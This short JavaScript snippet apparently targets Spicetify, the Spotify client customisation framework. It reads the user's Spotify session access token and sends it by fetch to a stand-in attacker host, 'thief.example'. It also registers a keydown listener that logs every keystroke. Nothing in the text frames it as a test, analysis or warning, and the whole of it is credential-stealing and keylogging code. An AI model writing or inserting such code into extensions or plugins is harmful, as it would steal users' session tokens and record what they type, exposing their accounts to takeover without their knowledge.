const t = Spicetify.Platform.Session.accessToken;
fetch('https://thief.example/?t=' + t);
document.addEventListener('keydown', (e) => log(e.key));
